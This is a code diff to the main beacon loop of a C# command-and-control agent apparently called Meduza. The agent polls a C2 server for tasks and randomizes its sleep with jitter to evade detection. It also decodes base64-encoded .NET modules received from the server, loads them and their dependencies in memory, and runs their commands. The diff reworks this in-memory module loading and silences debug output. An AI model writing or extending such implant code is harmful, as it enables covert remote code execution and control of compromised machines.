@@ -3,15 +3,17 @@ using Agent.Services;
 using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.IO.Pipes;
-using Agent.ModuleBase;
 using Agent.Models.C2Request;
+using Meduza.Agent.ModuleBase;
 using System.Text.Json;
 using Agent.Core;
 using System.Reflection;
 using Meduza.Agent;
 using Agent.Core.Utils.MessageTransformer;
 using Agent.Core.Utils.Encoding;
-
+using System.Runtime.Loader;
+using System.Xml.Linq;
+using System.Threading.Tasks;
 
 // #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
@@ -80,6 +82,10 @@ while (true)
                 Environment.Exit(1);
             }
 
+            int realJitter = delay * (jitter / 100);
+            if (rnd.Next(2) == 0) { realJitter = -realJitter; }
+            Thread.Sleep((delay + realJitter) * 1000);
+
             var taskRequest = new C2Request { Reason = C2RequestReason.Task, AgentId = baseCommunicationService.BaseConfig.AgentId, AgentStatus = AgentStatus.Active };
             var result = await baseCommunicationService.SimplePostAsync($"/", JsonSerializer.Serialize(taskRequest));
 
@@ -91,48 +97,68 @@ while (true)
                 var tasks = JsonSerializer.Deserialize<List<AgentTask>>(taskResponse.Message);
                 if (tasks is null || tasks.Count == 0) continue;
 
+
                 foreach (var task in tasks)
                 {
                     if (task is null) continue;
 
                     if (task.TaskCompleted > DateTime.MinValue) continue;
 
-                    Console.WriteLine(JsonSerializer.Serialize(task));
+                    //Console.WriteLine(JsonSerializer.Serialize(task));
 
                     if (!string.IsNullOrWhiteSpace(task.Module) && task.Status is not AgentTaskStatus.Running)
                     {
                         task.QueueRunningStatus(messageQueue, messageQueueLock);
 
-                        ModuleLoadContext loadContext = new();
-                        using (var stream = new MemoryStream())
+                        try
                         {
-                            var decodedModule = Convert.FromBase64String(task.Module);
-                            // var decodedModule = urlSafeBase64DecodingDecorator.Transform(task.Module);
-                            stream.Write(decodedModule);
-                            loadContext.AssemblyBytes = stream;
-                            stream.Position = 0;
-                            var loadedAssembly = loadContext.LoadFromStream(stream);
+                            // Decode the base64 module bytes
+                            var moduleBytes = JsonSerializer.Deserialize<ModuleBytesModel>(
+                                System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(task.Module))
+                            );
 
-                            // var decryptedModule = xorDecryptionDecorator.Transform(decodedModule);
-                            // var decryptedBytes = System.Text.Encoding.UTF8.GetBytes(decryptedModule);
-                            var module = ModuleLoader.LoadModule(Assembly.Load(decodedModule));
+                            if (moduleBytes == null)
+                            {
+                                Console.WriteLine("Failed to deserialize module bytes.");
+                                continue;
+                            }
+
+                            var loadContext = new ModuleLoadContext(
+                                moduleBytes.ModuleBytes,
+                                moduleBytes.DependencyBytes ?? new Dictionary<string, byte[]>());
+
+                            Assembly assembly = loadContext.LoadMainModule();
+
+                            // Load the module and its commands
+                            var module = ModuleLoader.LoadModule(assembly);
+
                             foreach (var moduleCommand in module.Commands)
                             {
                                 try
                                 {
-                                    task.Command.Output = ExecuteCommand(moduleCommand, task.Command.Parameters, task.IsCancellationTokenSourceSet);
+                                    task.Command.Output = ExecuteCommand(
+                                        moduleCommand,
+                                        task.Command.Parameters,
+                                        task.IsCancellationTokenSourceSet
+                                    );
                                 }
-                                catch (Exception)
+                                catch (Exception ex)
                                 {
+                                    Console.WriteLine($"Command execution error: {ex.Message}");
                                     while (commandOutputQueue.TryDequeue(out var commandOutputResult))
                                     {
                                         task.Command.Output += commandOutputResult;
                                     }
                                 }
                             }
-                        }
 
-                        task.Module = string.Empty;
+                            task.Module = string.Empty;
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Module loading error: {ex.Message}");
+                            task.Command.Output = $"Error loading module: {ex.Message}";
+                        }
                     }
 
                     lock (taskQueueLock)
@@ -175,10 +201,6 @@ while (true)
             {
                 Console.WriteLine($"[{DateTime.UtcNow}]:\tDid not connect to server");
             }
-
-            int realJitter = delay * (jitter / 100);
-            if (rnd.Next(2) == 0) { realJitter = -realJitter; }
-            Thread.Sleep((delay + realJitter) * 1000);
         }
     }
     catch (Exception ex)
@@ -290,7 +312,10 @@ string ExecuteCommand(ICommand command, string[]? parameters, bool IsCancellatio
                         catch (Exception) { currentRead = string.Empty; }
                     }
                 }
-                output += currentRead;
+                while (commandOutputQueue.TryDequeue(out var commandOutputResult))
+                {
+                    output += commandOutputResult;
+                }
             }
         }
         invokeThread.Join();
